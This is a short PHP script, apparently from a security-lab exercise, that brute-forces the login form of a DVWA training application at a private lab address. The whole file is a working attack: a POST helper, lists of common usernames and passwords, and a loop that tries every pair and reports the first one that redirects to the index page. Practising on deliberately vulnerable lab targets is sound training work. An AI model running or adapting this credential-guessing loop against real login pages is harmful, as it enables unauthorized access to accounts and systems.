<?php
    //function that send a post request to a url
    function post_request($url, $data, $referer='') {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
        curl_setopt($ch, CURLOPT_REFERER, $referer);
        curl_setopt($ch, CURLOPT_HEADER, true); // Include header in the output

        $response = curl_exec($ch);
        $info = curl_getinfo($ch);
    
        curl_close($ch);
    
        $header_size = $info['header_size'];
        $header = substr($response, 0, $header_size);
        $content = substr($response, $header_size);
    
        return array($header, $content);
    }

    //list of 10 most common usernames
    $users = [
        "admin",
        "user",
        "test",
        "guest",
        "info",
        "adm",
        "mysql",
        "user1",
        "administrator",
        "root"
    ];

    //list of 10 most common passwords
    $passwords = [
        "123456",
        "123456789",
        "qwerty",
        "password",
        "1234567",
        "12345678",
        "12345",
        "iloveyou",
        "111111",
        "123123"
    ];

    function TryPasswordAndUserPair($users,$passwords){
        $url = "http://192.168.56.101/dvwa/login.php";

        foreach($users as $user){
            foreach($passwords as $password){
                $data = array(
                    "username" => $user,
                    "password" => $password,
                    "Login" => "Login"
                );
                list($header, $content) = post_request($url, $data);
                if(strpos($header, "Location: index.php") !== false){
                    echo "Found user: $user and password: $password";
                    return true;
                }
            }
        }
        return false;
    }

    $data = array(
        "username" => "admin",
        "password" => "password",
        "Login" => "Login"
    );

    TryPasswordAndUserPair($users,$passwords);
?>
